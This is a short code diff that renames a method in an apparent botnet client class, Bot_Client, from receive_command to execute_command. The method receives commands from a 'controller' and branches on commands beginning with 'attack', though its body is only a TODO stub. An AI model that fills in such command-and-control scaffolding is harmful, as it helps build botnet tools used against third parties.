@@ -100,7 +100,7 @@ class Bot_Client:
         return text
 
     # function to receive and execute the command sent by the controller
-    def receive_command(self, command):
+    def execute_command(self, command):
         # TODO add function call for each command
         if command.startswith("attack"):
             command = command.split()
